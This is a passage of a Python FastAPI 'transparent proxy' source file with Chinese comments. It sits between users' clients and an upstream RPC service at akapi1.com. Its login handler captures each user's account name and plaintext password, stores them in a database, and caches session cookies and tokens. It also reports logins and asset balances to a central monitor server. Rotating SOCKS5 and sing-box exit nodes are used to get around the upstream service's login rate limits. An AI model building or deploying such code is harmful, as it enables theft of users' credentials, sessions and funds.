# -*- coding: utf-8 -*-

"""

透明代理服务器

用户在本地运行，游戏客户端连接本地代理，代理直接转发到API服务器。

API服务器看到的是用户自己的IP，同时代理拦截登录/资产数据并上报到中央监控。

"""



import asyncio

import json

import sys

import os

import io

import time

import re

import logging

from urllib.parse import parse_qs, urlsplit, urlencode, urlunsplit

from logging.handlers import RotatingFileHandler

from datetime import datetime

from typing import Optional



import httpx

import secrets

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect, HTTPException

from fastapi.responses import JSONResponse, HTMLResponse, Response

from fastapi.middleware.cors import CORSMiddleware

import uvicorn



# 修复Windows控制台中文乱码

if sys.platform == 'win32':

    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')



# 加载配置

sys.path.insert(0, os.path.dirname(__file__))

try:

    from config import *

except ImportError:

    PROXY_HOST = "0.0.0.0"

    PROXY_PORT = 8080

    AKAPI_URL = "https://www.akapi1.com/RPC/"

    MONITOR_SERVER = ""

    MONITOR_API_KEY = ""

    LOG_FILE = "proxy.log"

    LOG_LEVEL = "INFO"

    LOG_TO_CONSOLE = True

    LOG_TO_FILE = True

    REQUEST_TIMEOUT = 30

    ENABLE_LOCAL_BAN = True

    DB_HOST = "127.0.0.1"

    DB_PORT = 5432

    DB_NAME = "ak_proxy"

    DB_USER = "ak_proxy"

    DB_PASSWORD = "ak2026db"

    DB_MIN_POOL = 10

    DB_MAX_POOL = 30

    SOCKS5_EXITS = []

    LOGIN_RATE_PER_EXIT = 8



# 数据库模块

import database_pg as db

# 出口IP调度模块

from outbound_dispatcher import dispatcher, ace_sell_dispatcher, OutboundExit



# 初始化调度器配置

if SOCKS5_EXITS:

    dispatcher.configure_from_list(SOCKS5_EXITS)

dispatcher.MAX_LOGIN_PER_MIN = LOGIN_RATE_PER_EXIT




# ===== 日志配置 =====

logger = logging.getLogger("TransparentProxy")

logger.setLevel(getattr(logging, LOG_LEVEL, logging.INFO))

formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')



if LOG_TO_CONSOLE:

    ch = logging.StreamHandler(sys.stdout)

    ch.setFormatter(formatter)

    logger.addHandler(ch)



if LOG_TO_FILE:

    log_path = os.path.join(os.path.dirname(__file__), LOG_FILE)

    fh = RotatingFileHandler(

        log_path, maxBytes=1*1024*1024*1024, backupCount=3, encoding='utf-8'

    )

    fh.setFormatter(formatter)

    logger.addHandler(fh)



# ===== 统计数据 =====

class ProxyStats:

    def __init__(self):

        self.start_time = datetime.now()

        self.total_requests = 0

        self.login_requests = 0

        self.login_success = 0

        self.login_fail = 0

        self.index_data_requests = 0

        self.other_requests = 0

        self.errors = 0

        self.last_login_account = ""

        self.last_login_time = ""

        self.report_success = 0

        self.report_fail = 0

        # 本地封禁列表

        self.banned_accounts: set = set()

        self.banned_ips: set = set()



stats = ProxyStats()



# ===== FastAPI 应用 =====

app = FastAPI(title="AK透明代理")



app.add_middleware(

    CORSMiddleware,

    allow_origins=["*"],

    allow_credentials=True,

    allow_methods=["*"],

    allow_headers=["*"],

)





@app.on_event("startup")

async def startup():

    """启动时初始化数据库连接池"""

    try:

        await db.init_db(

            host=DB_HOST, port=DB_PORT, database=DB_NAME,

            user=DB_USER, password=DB_PASSWORD,

            min_size=DB_MIN_POOL, max_size=DB_MAX_POOL

        )

        logger.info("PostgreSQL 数据库连接成功")

        # 启动定期清理任务

        asyncio.create_task(_periodic_cleanup())

    except Exception as e:

        logger.error(f"PostgreSQL 连接失败: {e}，将使用内存模式")

    # 启动出口调度器

    await dispatcher.start()

    # 注入403/429持久化回调
    dispatcher.alert_callback = db.insert_exit_event

    # 预加载封禁集合到内存，避免热路径查DB
    try:
        banned_usernames, banned_ips = await db.load_banned_sets()
        stats.banned_accounts.update(banned_usernames)
        stats.banned_ips.update(banned_ips)
        logger.info(f"封禁集合已加载: {len(banned_usernames)} 账号, {len(banned_ips)} IP")
    except Exception as e:
        logger.warning(f"加载封禁集合失败: {e}")

    # 自动恢复上次保存的节点配置
    await _restore_dispatcher_exits()
    # 节点全部加载完毕后触发一次IP检测（fire-and-forget，不阻塞启动）
    asyncio.create_task(dispatcher.detect_all_ips())





async def _restore_dispatcher_exits():
    """启动时自动恢复上次保存的节点配置"""
    try:
        config_file = os.path.join(os.path.dirname(__file__), "dispatcher_exits.json")
        if not os.path.exists(config_file):
            logger.info("[Dispatcher] 未找到保存的节点配置，跳过恢复")
            return
        
        with open(config_file, "r", encoding="utf-8") as f:
            exits_config = json.load(f)
        
        nodes_to_restore = exits_config.get("nodes", [])
        base_port = exits_config.get("base_port", 10001)
        
        if not nodes_to_restore:
            logger.info("[Dispatcher] 节点配置为空，跳过恢复")
            return
        
        # 生成sing-box配置并重载
        import singbox_manager as sbm
        apply_result = sbm.apply_nodes(nodes_to_restore, base_port)
        
        if not apply_result["success"]:
            logger.warning(f"[Dispatcher] sing-box配置恢复失败: {apply_result.get('message', '')}")
            return
        
        # 等待sing-box启动
        await asyncio.sleep(2)
        
        # 清除旧的隧道出口（保留#0直连）
        while len(dispatcher.exits) > 1:
            dispatcher.exits.pop()
        
        # 注册节点到dispatcher
        for i, node in enumerate(nodes_to_restore):
            port = base_port + i
            name = node.get("display_name", node.get("name", f"node_{i}"))
            dispatcher.add_socks5(name, port)
        
        logger.info(f"[Dispatcher] 已自动恢复 {len(nodes_to_restore)} 个节点配置")
        
    except Exception as e:
        logger.warning(f"[Dispatcher] 恢复节点配置失败: {e}")

async def _periodic_cleanup():

    """每6小时清理旧数据，平衡性能和存储"""

    while True:

        await asyncio.sleep(6 * 3600)  # 6小时

        try:

            await db.cleanup_old_records(

                login_days=90,           # 登录记录保留90天

                max_login_rows=500000    # 最多50万条登录记录

            )

        except Exception as e:

            logger.warning(f"定期清理失败: {e}")





@app.on_event("shutdown")

async def shutdown():

    """关闭时释放数据库连接池"""

    await db.close_db()



# ===== 工具函数 =====

def parse_request_params(content_type: str, query_params: dict, raw_body: bytes) -> dict:

    """统一解析请求参数（支持JSON/Form/QueryString）"""

    params = dict(query_params)

    

    if not raw_body:

        return params

    

    try:

        if "application/json" in content_type:

            body = json.loads(raw_body)

            params.update(body)

        elif "application/x-www-form-urlencoded" in content_type:

            from urllib.parse import parse_qs

            form_data = parse_qs(raw_body.decode('utf-8'))

            for key, value in form_data.items():

                params[key] = value[0] if value else ''

        else:

            # 尝试JSON，失败则尝试Form

            try:

                body = json.loads(raw_body)

                params.update(body)

            except (json.JSONDecodeError, UnicodeDecodeError):

                try:

                    from urllib.parse import parse_qs

                    form_data = parse_qs(raw_body.decode('utf-8'))

                    for key, value in form_data.items():

                        params[key] = value[0] if value else ''

                except Exception:

                    pass

    except Exception as e:

        logger.warning(f"参数解析异常: {e}")

    

    return params





async def report_to_monitor(endpoint: str, data: dict):

    """上报数据到中央监控服务器（异步，不阻塞主流程）"""

    if not MONITOR_SERVER:

        return

    

    url = f"{MONITOR_SERVER.rstrip('/')}/api/transparent_proxy/{endpoint}"

    headers = {"Content-Type": "application/json"}

    if MONITOR_API_KEY:

        headers["X-API-Key"] = MONITOR_API_KEY

    

    try:

        async with httpx.AsyncClient(verify=False, timeout=10) as client:

            resp = await client.post(url, json=data, headers=headers)

            if resp.status_code == 200:

                stats.report_success += 1

            else:

                stats.report_fail += 1

                logger.warning(f"上报失败 [{endpoint}]: HTTP {resp.status_code}")

    except Exception as e:

        stats.report_fail += 1

        logger.debug(f"上报异常 [{endpoint}]: {e}")


async def forward_request(method: str, api_path: str, content_type: str,

                          params: dict, raw_body: bytes, headers: dict,

                          client_ip: str = "",

                          is_login: bool = False,

                          selected_exit=None,

                          force_direct: bool = False) -> httpx.Response:

    """转发请求到真实API服务器（通过出口调度器选择出口IP）"""

    url = AKAPI_URL + api_path

    # 从nginx传递的头中提取用户真实IP

    real_ip = client_ip or headers.get("x-real-ip", "") or headers.get("x-forwarded-for", "").split(",")[0].strip()

    fwd_headers = {

        "User-Agent": headers.get("user-agent", ""),

        "Content-Type": content_type or "application/json",

        "Accept": headers.get("accept", "*/*"),

    }

    if headers.get("cookie"):

        fwd_headers["Cookie"] = headers.get("cookie", "")

    if real_ip:

        fwd_headers["X-Real-IP"] = real_ip

        fwd_headers["X-Forwarded-For"] = real_ip



    # 通过调度器选择出口

    if force_direct:

        exit_obj = _get_direct_exit()

    else:

        exit_obj = selected_exit or _select_forward_exit(api_path, is_login=is_login)

    logger.debug(f"[Forward] {api_path} -> 出口[{exit_obj.name}]")



    if is_login:

        try:

            result = await dispatcher.forward(

                exit_obj, method, url, fwd_headers,

                content_type=content_type, params=params,

                raw_body=raw_body, timeout=REQUEST_TIMEOUT

            )

            exit_obj.confirm_login()

            return result

        except Exception:

            exit_obj.cancel_login()

            raise

    return await dispatcher.forward(

        exit_obj, method, url, fwd_headers,

        content_type=content_type, params=params,

        raw_body=raw_body, timeout=REQUEST_TIMEOUT

    )



def _select_forward_exit(api_path: str, is_login: bool = False, preferred_exit_name: str = ""):

    preferred = (preferred_exit_name or "").strip()

    if preferred and api_path != "ACE_Sell":

        for ex in getattr(dispatcher, "exits", []):

            if ex.name != preferred:

                continue

            if (ex.healthy or ex.is_direct) and not ex.is_frozen:

                ex.record_request()

                return ex

            logger.warning(f"[ForwardExitFallback] api={api_path} preferred={preferred} reason=unavailable")

            break

    if is_login:

        return dispatcher.pick_login_exit()

    if api_path == "ACE_Sell":

        return ace_sell_dispatcher.acquire()

    return dispatcher.pick_api_exit()


def _get_direct_exit() -> OutboundExit:

    exits = getattr(dispatcher, "exits", []) or []

    if exits:

        return exits[0]

    return OutboundExit("direct", None)


# ===== 状态页 =====

@app.get("/", response_class=HTMLResponse)

async def status_page():

    """代理状态页面"""

    uptime = datetime.now() - stats.start_time

    hours, remainder = divmod(int(uptime.total_seconds()), 3600)

    minutes, seconds = divmod(remainder, 60)

    

    monitor_status = f'<span style="color:#00ff88">已连接 ({MONITOR_SERVER})</span>' if MONITOR_SERVER else '<span style="color:#888">未配置</span>'

    

    html = f"""<!DOCTYPE html>

<html><head><meta charset="utf-8"><title>AK透明代理</title>

<style>

body {{ background: #0a0e1a; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; padding: 40px; }}

.card {{ background: #141928; border: 1px solid #2a2f45; border-radius: 12px; padding: 25px; margin: 15px 0; }}

h1 {{ color: #00e5ff; }} h3 {{ color: #00ff88; margin-top: 0; }}

.stat {{ display: inline-block; min-width: 150px; margin: 8px 15px 8px 0; }}

.stat .val {{ font-size: 28px; font-weight: bold; color: #00e5ff; }}

.stat .label {{ font-size: 13px; color: #888; }}

.ok {{ color: #00ff88; }} .err {{ color: #ff5252; }}

</style></head><body>

<h1>🔄 AK 透明代理服务器</h1>

<div class="card">

    <h3>运行状态</h3>

    <div class="stat"><div class="val">{hours}h {minutes}m {seconds}s</div><div class="label">运行时间</div></div>

    <div class="stat"><div class="val">{stats.total_requests}</div><div class="label">总请求数</div></div>

    <div class="stat"><div class="val">{stats.errors}</div><div class="label">错误数</div></div>

</div>

<div class="card">

    <h3>登录统计</h3>

    <div class="stat"><div class="val">{stats.login_requests}</div><div class="label">登录请求</div></div>

    <div class="stat"><div class="val ok">{stats.login_success}</div><div class="label">成功</div></div>

    <div class="stat"><div class="val err">{stats.login_fail}</div><div class="label">失败</div></div>

    <div class="stat"><div class="val">{stats.last_login_account or '-'}</div><div class="label">最近登录</div></div>

</div>

<div class="card">

    <h3>API统计</h3>

    <div class="stat"><div class="val">{stats.index_data_requests}</div><div class="label">IndexData</div></div>

    <div class="stat"><div class="val">{stats.other_requests}</div><div class="label">其他RPC</div></div>

</div>

<div class="card">

    <h3>中央监控上报</h3>

    <p>状态: {monitor_status}</p>

    <div class="stat"><div class="val ok">{stats.report_success}</div><div class="label">上报成功</div></div>

    <div class="stat"><div class="val err">{stats.report_fail}</div><div class="label">上报失败</div></div>

</div>

<div class="card" style="color:#888; font-size:13px;">

    <p>API目标: {AKAPI_URL}</p>

    <p>监听地址: {PROXY_HOST}:{PROXY_PORT}</p>

    <p>启动时间: {stats.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>

</div>

</body></html>"""

    return html





# ===== 登录拦截 =====

@app.api_route("/RPC/Login", methods=["GET", "POST"])

async def proxy_login(request: Request):

    """拦截登录请求：记录 → 转发(用户自己的IP) → 处理结果 → 上报"""

    stats.total_requests += 1

    stats.login_requests += 1

    

    client_ip = request.client.host if request.client else "unknown"

    user_agent = request.headers.get("user-agent", "")

    content_type = request.headers.get("content-type", "")

    

    # 解析参数

    raw_body = await request.body() if request.method == "POST" else b""

    params = parse_request_params(content_type, dict(request.query_params), raw_body)

    

    account = params.get("account", "unknown")

    password = params.get("password", "")

    referer = request.headers.get("referer", "")

    

    logger.info(f"[Login] 账号={account}, IP={client_ip}")

    

    # 本地封禁检查（内存集合，启动时已从DB预加载）

    if ENABLE_LOCAL_BAN:

        if account.lower() in stats.banned_accounts or client_ip in stats.banned_ips:

            logger.warning(f"[Login] 封禁拦截: account={account}, IP={client_ip}")

            return JSONResponse({"Error": True, "Msg": "您的账号或IP已被封禁"})

    

    # 白名单检查

    persistent_login = False

    # ===== 公开访问版本：已注释白名单验证 =====

    # try:

    #     auth_info = await db.check_authorized(account)

    #     if not auth_info:

    #         logger.info(f"[Login] 白名单拦截(未授权): {account}")

    #         return JSONResponse({"Error": True, "Msg": "未获得访问权限，请联系上属老师获取权限或使用ak2018，ak928登录！"})

    #     if auth_info['expire_time'] < datetime.now():

    #         logger.info(f"[Login] 白名单拦截(已过期): {account}")

    #         return JSONResponse({"Error": True, "Msg": "您的访问权限已到期，请联系上属老师续期或使用ak2018，ak928登录！"})

    #     persistent_login = auth_info.get('persistent_login', False)

    # except Exception as e:

    #     logger.warning(f"[Login] 白名单检查异常: {e}，放行")

    logger.info(f"[Login] 公开访问模式，跳过白名单检查: {account}")



    # 直接转发到API服务器（透传用户真实IP）

    try:

        response = await forward_request(

            request.method, "Login", content_type, params, raw_body, dict(request.headers),

            client_ip=client_ip, is_login=True

        )

        result = response.json()

    except Exception as e:

        stats.errors += 1

        logger.error(f"[Login] 转发失败: {e}")

        return JSONResponse({"Error": True, "Msg": f"API连接失败: {str(e)}"})

    

    # 判断登录结果

    is_success = result.get("Error") == False or (not result.get("Error") and result.get("UserData"))

    

    if is_success:

        stats.login_success += 1

        stats.last_login_account = account

        stats.last_login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        logger.info(f"[Login] 登录成功: {account}")

        cached = _cache_ak_auth(account, password, result, response.headers)

        try:

            await db.save_ak_auth_state(

                account,

                userkey=cached.get("userkey", ""),

                cookies=cached.get("cookies", {}),

                login_payload=cached.get("login_result", {}),

                ttl_seconds=_BROWSE_SESSION_TTL,

            )

        except Exception as e:

            logger.warning(f"[Login] AK登录态持久化失败: {e}")

        admin_bs_id, admin_session, admin_bs_source = _resolve_browse_session(

            request,

            preferred_username=account,

            source_order=("cookie",),

        )

        admin_referer = request.headers.get("referer", "")

        if admin_session:

            try:

                await _apply_cached_auth_to_browse_session(admin_session, cached, result, account, password)

                logger.warning(f"[BrowseLoginSession] account={account} bs={admin_bs_id} source={admin_bs_source} referer={admin_referer} cookies={len(admin_session.get('cookies', {}))}")

            except Exception as e:

                logger.warning(f"[BrowseLoginSession] 持久化失败 account={account} bs={admin_bs_id} source={admin_bs_source} referer={admin_referer}: {e}")

    else:

        stats.login_fail += 1

        logger.info(f"[Login] 登录失败: {account}, Msg={result.get('Msg', '')}")

    if "/admin/ak-web/" in referer or "/admin/ak-site/" in referer:

        logger.warning(f"[IframeLoginApi] route=/RPC/Login phase=response account={account} success={int(is_success)} referer={referer} body_head={json.dumps(result, ensure_ascii=False)[:200]}")

    

    # 记录到 PostgreSQL 数据库

    try:

        await db.record_login(

            username=account, ip_address=client_ip,

            user_agent=user_agent[:200],

            request_path="/RPC/Login",

            status_code=200 if is_success else 401,

            is_success=is_success, password=password,

            extra_data=json.dumps({"status": "success" if is_success else "failed", "msg": result.get("Msg", "")})

        )

    except Exception as e:

        logger.warning(f"[Login] 数据库记录失败: {e}")



    # 异步上报到中央监控服务器

    report_data = {

        "account": account,

        "client_ip": client_ip,

        "user_agent": user_agent[:200],

        "is_success": is_success,

        "msg": result.get("Msg", ""),

        "time": datetime.now().replace(microsecond=0).isoformat(),

    }

    

    # 如果登录成功，提取资产数据并存入数据库

    if is_success and result.get("UserData"):

        user_data = result["UserData"]

        logger.info(f"[Login] UserData字段: {list(user_data.keys())}")

        logger.info(f"[Login] L={user_data.get('L')}, R={user_data.get('R')}, F={user_data.get('F')}, S={user_data.get('S')}")

        try:

            await db.update_user_assets(account, user_data)

        except Exception as e:

            logger.warning(f"[Login] 资产保存失败: {e}")

        report_data["assets"] = {

            "EP": user_data.get("EP", 0),

            "SP": user_data.get("SP", 0),

            "RP": user_data.get("RP", 0),

            "TP": user_data.get("TP", 0),

            "ACECount": user_data.get("ACECount", 0),

            "TotalACE": user_data.get("TotalACE", 0),

            "WeeklyMoney": user_data.get("WeeklyMoney", 0),

            "HonorName": user_data.get("HonorName", ""),

            "LevelNumber": user_data.get("LevelNumber", 0),

            "Rate": user_data.get("Rate", 0),

            "Credit": user_data.get("Credit", 0),

            "AP": user_data.get("AP", 0),

            "LP": user_data.get("LP", 0),

            "Convertbalance": user_data.get("Convertbalance", 0),

            "L": user_data.get("L", 0),

            "R": user_data.get("R", 0),

            "F": user_data.get("F", 0),

            "S": user_data.get("S", 0),

        }

    asyncio.create_task(report_to_monitor("login", report_data))

    asyncio.create_task(ws_manager.broadcast({

        "type": "new_login",

        "data": {

            "username": account,

            "ip": client_ip,

            "status": "success" if is_success else "failed",

            "msg": result.get("Msg", ""),

            "time": datetime.now().strftime('%H:%M:%S'),

            "assets": report_data.get("assets"),

        }

    }))

    resp = JSONResponse(result)
    resp = _mirror_upstream_set_cookies(resp, response.headers)

    if is_success:

        resp.set_cookie(key="ak_username", value=account, max_age=86400*30, httponly=False, samesite="lax")

        if persistent_login:

            resp.set_cookie(key="ak_persist", value="1", max_age=86400*30, httponly=False, samesite="lax")

        else:

            resp.delete_cookie(key="ak_persist")

    return resp





# ===== IndexData 拦截 =====

@app.api_route("/RPC/public_IndexData", methods=["GET", "POST"])

async def proxy_index_data(request: Request):

    """拦截资产数据请求：转发 → 提取数据 → 上报"""

    stats.total_requests += 1

    stats.index_data_requests += 1

    

    client_ip = request.client.host if request.client else "unknown"

    content_type = request.headers.get("content-type", "")

    

    raw_body = await request.body() if request.method == "POST" else b""

    params = parse_request_params(content_type, dict(request.query_params), raw_body)

    

    logger.debug(f"[IndexData] 请求参数: {list(params.keys())}")

    

    # 直接转发（透传用户真实IP）

    try:

        response = await forward_request(

            request.method, "public_IndexData", content_type, params, raw_body, dict(request.headers),

            client_ip=client_ip

        )

        result = response.json()

    except Exception as e:

        stats.errors += 1

        logger.error(f"[IndexData] 转发失败: {e}")

        return JSONResponse({"Error": True, "Msg": f"API连接失败: {str(e)}"})

    

    # 提取资产数据并上报

    if not result.get("Error") and result.get("Data"):

        data = result["Data"]

        # 从请求参数、响应数据、cookie中提取用户名（不用全局变量，避免并发错乱）

        username = (params.get("account") or params.get("Account") or

                   data.get("UserName") or data.get("Account") or

                   request.cookies.get("ak_username") or "unknown")

        if username and username != "unknown" and ('ACECount' in data or 'EP' in data):

            # 公开版本：保存所有用户的资产数据

            try:

                await db.update_user_assets(username, data)

            except Exception as e:

                logger.warning(f"[IndexData] 资产保存失败: {e}")

            report_data = {

                "account": username,

                "client_ip": client_ip,

                "time": datetime.now().replace(microsecond=0).isoformat(),

                "assets": {

                    "EP": data.get("EP", 0),

                    "SP": data.get("SP", 0),

                    "RP": data.get("RP", 0),

                    "TP": data.get("TP", 0),

                    "ACECount": data.get("ACECount", 0),

                    "TotalACE": data.get("TotalACE", 0),

                    "WeeklyMoney": data.get("WeeklyMoney", 0),

                    "HonorName": data.get("HonorName", ""),

                    "LevelNumber": data.get("LevelNumber", 0),

                    "Rate": data.get("Rate", 0),

                    "Credit": data.get("Credit", 0),

                    "AP": data.get("AP", 0),

                    "LP": data.get("LP", 0),

                    "Convertbalance": data.get("Convertbalance", 0),

                }

            }

            asyncio.create_task(report_to_monitor("asset_update", report_data))

            asyncio.create_task(ws_manager.broadcast({

                "type": "asset_update",

                "data": {

                    "username": username,

                    "time": datetime.now().strftime('%H:%M:%S'),

                    "assets": report_data["assets"],

                }

            }))

            logger.info(f"[IndexData] 资产更新: {username}")

    

    return JSONResponse(result)





# ===== 通用 RPC 代理 =====

@app.api_route("/RPC/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])

async def proxy_rpc(path: str, request: Request):

    """透明转发所有其他RPC请求"""

    stats.total_requests += 1

    stats.other_requests += 1

    

    client_ip = request.client.host if request.client else "unknown"

    content_type = request.headers.get("content-type", "")

    referer = request.headers.get("referer", "")

    fetch_dest = request.headers.get("sec-fetch-dest", "")

    accept = request.headers.get("accept", "")

    cookie_bs = (request.cookies.get(_BROWSE_SESSION_COOKIE) or "").strip()

    

    # 封禁检查（优先数据库）

    if ENABLE_LOCAL_BAN:

        try:

            if await db.is_banned(ip_address=client_ip):

                return JSONResponse({"Error": True, "Msg": "您的IP已被封禁"})

        except Exception:

            if client_ip in stats.banned_ips:
                return JSONResponse({"Error": True, "Msg": "您的IP已被封禁"})
    
    raw_body = None
    if request.method in ["POST", "PUT"]:
        raw_body = await request.body()

    

    params = {}

    if raw_body:

        try:

            params = json.loads(raw_body)

        except (json.JSONDecodeError, UnicodeDecodeError):

            pass

    

    logger.debug(f"[RPC/{path}] 转发请求")

    

    try:

        response = await forward_request(

            request.method, path, content_type, params, raw_body, dict(request.headers),

            client_ip=client_ip

        )

        try:

            result = response.json()
            if "/admin/ak-web/" in referer:
                logger.warning(f"[IframeRPCLeak] path={path} status={response.status_code} body_head={json.dumps(result, ensure_ascii=False)[:200]}")

            proxy_response = JSONResponse(content=result, status_code=response.status_code)
            return _mirror_upstream_set_cookies(proxy_response, response.headers)

        except Exception:

            proxy_response = JSONResponse(content=response.text, status_code=response.status_code)
            return _mirror_upstream_set_cookies(proxy_response, response.headers)

    except Exception as e:

        stats.errors += 1

        logger.error(f"[RPC/{path}] 转发失败: {e}")

        return JSONResponse({"Error": True, "Msg": f"请求失败: {str(e)}"}, status_code=500)





# ===== 管理API =====

@app.get("/api/status")

async def api_status():

    """获取代理状态（JSON）"""

    uptime = (datetime.now() - stats.start_time).total_seconds()

    return {

        "running": True,

        "uptime_seconds": int(uptime),

        "total_requests": stats.total_requests,

        "login": {

            "total": stats.login_requests,

            "success": stats.login_success,

            "fail": stats.login_fail,

            "last_account": stats.last_login_account,

            "last_time": stats.last_login_time,

        },

        "index_data_requests": stats.index_data_requests,

        "other_requests": stats.other_requests,

        "errors": stats.errors,

        "report": {

            "server": MONITOR_SERVER or "未配置",

            "success": stats.report_success,

            "fail": stats.report_fail,

        },

        "api_target": AKAPI_URL,

        "dispatcher": dispatcher.summary(),

    }





@app.get("/api/dispatcher")

async def api_dispatcher_status():

    """获取出口调度器状态"""

    return dispatcher.get_status()





@app.post("/api/dispatcher/add")

async def api_dispatcher_add(request: Request):

    """添加一个SOCKS5出口"""

    data = await request.json()

    name = data.get("name", "").strip()

    port = data.get("port")

    if not name or not port:

        return {"success": False, "message": "需要 name 和 port"}

    try:

        port = int(port)

    except (ValueError, TypeError):

        return {"success": False, "message": "port 必须为整数"}

    idx = dispatcher.add_socks5(name, port)

    return {"success": True, "index": idx, "message": f"已添加出口 #{idx}: {name}"}





@app.post("/api/dispatcher/remove")

async def api_dispatcher_remove(request: Request):

    """移除一个出口"""

    data = await request.json()

    index = data.get("index")

    if index is None:

        return {"success": False, "message": "需要 index"}

    try:

        index = int(index)

    except (ValueError, TypeError):

        return {"success": False, "message": "index 必须为整数"}

    if dispatcher.remove_exit(index):

        return {"success": True, "message": f"已移除出口 #{index}"}

    return {"success": False, "message": f"无法移除出口 #{index} (不存在或为直连)"}





@app.post("/api/dispatcher/detect_ips")

async def api_dispatcher_detect_ips():

    """手动触发所有出口的IP检测"""

    await dispatcher.detect_all_ips()

    return {"success": True, "message": "IP检测完成", "exits": [

        {"index": i, "name": ex.name, "exit_ip": ex.exit_ip}

        for i, ex in enumerate(dispatcher.exits)

    ]}





@app.post("/api/dispatcher/rate_limit")
async def api_dispatcher_rate_limit(request: Request):
    """设置指定出口的速率限制（req/min），0=不限速"""
    data = await request.json()
    index = data.get("index")
    limit = data.get("limit", 0)
    if index is None:
        return {"success": False, "message": "需要 index"}
    ok = dispatcher.set_rate_limit(int(index), int(limit))
    msg = f"出口 #{index} 限速已设置: {limit or '不限速'}" if limit else f"出口 #{index} 限速已解除"
    return {"success": ok, "message": msg if ok else f"出口 #{index} 不存在"}


@app.post("/api/dispatcher/max_login")
async def api_dispatcher_max_login(request: Request):
    """动态调整每出口每分钟最大登录次数"""
    data = await request.json()
    value = data.get("value", 10)
    ok = dispatcher.set_max_login_per_min(int(value))
    return {"success": ok, "message": f"登录限额已调整为 {value}/min" if ok else "值无效（须≥1）"}


@app.post("/api/dispatcher/start_singbox")
async def api_dispatcher_start_singbox():
    """手动启动 sing-box 服务"""
    import singbox_manager as sbm
    try:
        sbm.reload_service()
        return {"success": True, "message": "sing-box 已启动/重载"}
    except Exception as e:
        return {"success": False, "message": f"启动失败: {str(e)}"}


@app.get("/api/dispatcher/events")
async def api_dispatcher_events(exit_name: str = None, status_code: int = None,
                                 hours: int = 24, limit: int = 200):
    """查询403/429风控事件，支持按出口名/状态码/时间范围过滤"""
    try:
        rows = await db.query_exit_events(exit_name=exit_name, status_code=status_code,
                                          hours=hours, limit=limit)
        return {"events": rows, "total": len(rows)}
    except Exception as e:
        return {"events": [], "total": 0, "error": str(e)}


@app.get("/api/dispatcher/logs/{index}")

async def api_dispatcher_exit_logs(index: int):

    """获取指定出口的错误日志"""

    logs = dispatcher.get_exit_logs(index)

    name = dispatcher.exits[index].name if 0 <= index < len(dispatcher.exits) else "unknown"

    return {"index": index, "name": name, "logs": logs}





@app.post("/api/dispatcher/parse_sub")

async def api_dispatcher_parse_sub(request: Request):

    """解析订阅: 支持URL自动获取、文本解析或JSON配置提取"""

    from sub_parser import fetch_subscription, parse_subscription_text
    import json as json_lib

    try:
        data = await request.json()
    except Exception:
        return {"error": "请求体不是合法 JSON"}

    url = data.get("url", "").strip()
    text = data.get("text", "").strip()
    json_config = data.get("json", "").strip()

    # text 输入框误粘 URL 时自动识别
    if not url and text and (text.startswith("http://") or text.startswith("https://")):
        url, text = text, ""

    try:
        if url:
            result = fetch_subscription(url)
        elif text:
            result = parse_subscription_text(text)
        elif json_config:
            # 从JSON配置中提取节点
            try:
                config = json_lib.loads(json_config)
                outbounds = config.get("outbounds", [])
                nodes = []
                servers = {}
                regions = {}
                for ob in outbounds:
                    if ob.get("type") in ["vless", "hysteria2", "vmess", "trojan", "shadowsocks", "ss"]:
                        tag = ob.get("tag", "Unknown")
                        server = ob.get("server", "")
                        port = ob.get("server_port", 0)
                        region_code = "UN"
                        region_label = "未知"
                        tag_lower = tag.lower()
                        if "香港" in tag or "hk" in tag_lower or "hong" in tag_lower:
                            region_code, region_label = "HK", "香港"
                        elif "新加坡" in tag or "sg" in tag_lower or "singapore" in tag_lower:
                            region_code, region_label = "SG", "新加坡"
                        elif "日本" in tag or "jp" in tag_lower or "japan" in tag_lower:
                            region_code, region_label = "JP", "日本"
                        elif "美国" in tag or "us" in tag_lower or "america" in tag_lower:
                            region_code, region_label = "US", "美国"
                        elif "台湾" in tag or "tw" in tag_lower or "taiwan" in tag_lower:
                            region_code, region_label = "TW", "台湾"
                        nodes.append({"name": tag, "type": ob.get("type"), "server": server,
                                      "port": port, "region_code": region_code,
                                      "region_label": region_label, "outbound_config": ob})
                        if server not in servers:
                            servers[server] = []
                        servers[server].append(len(nodes) - 1)
                        if region_code not in regions:
                            regions[region_code] = {"label": region_label, "count": 0}
                        regions[region_code]["count"] += 1
                result = {"format": "singbox_json", "node_count": len(nodes),
                          "unique_servers": len(servers), "nodes": nodes,
                          "servers": servers, "regions": regions}
            except Exception as e:
                return {"error": f"JSON解析失败: {str(e)}"}
        else:
            return {"error": "请输入订阅链接、订阅内容或JSON配置"}
    except Exception as e:
        logger.error(f"[ParseSub] 解析异常: {e}")
        return {"error": f"解析失败: {str(e)}"}

    return result





@app.post("/api/dispatcher/apply_sub")

async def api_dispatcher_apply_sub(request: Request):

    """

    一键应用订阅: 解析 → 生成sing-box配置 → 写盘 → 重载服务 → 注册出口到dispatcher

    前端批量添加时调用此接口，实现热重载生效

    """

    import singbox_manager as sbm

    from sub_parser import fetch_subscription, parse_subscription_text



    data = await request.json()

    url = data.get("url", "").strip()

    text = data.get("text", "").strip()
    
    nodes = data.get("nodes")  # 直接传入的节点列表（来自JSON解析）
    
    servers_dict = data.get("servers")  # 服务器分组

    selected_servers = data.get("selected_servers", [])  # [{server, name}] (旧格式，兼容保留)
    selected_node_indices = data.get("selected_node_indices")  # [int] 按节点索引选择（新格式）

    base_port = int(data.get("base_port", 10001))

    # text 输入框误粘 URL 时自动识别
    if not url and text and (text.startswith("http://") or text.startswith("https://")):
        url, text = text, ""

    # 1) 解析订阅或使用已解析的节点

    if url:

        parsed = fetch_subscription(url)

    elif text:

        parsed = parse_subscription_text(text)
    
    elif nodes and servers_dict:
        # 使用前端已解析的节点（来自JSON配置）
        parsed = {
            "nodes": nodes,
            "servers": servers_dict,
            "format": data.get("format", "direct")
        }

    else:

        return {"success": False, "message": "需要 url、text 或 nodes 参数"}



    if parsed.get("error"):

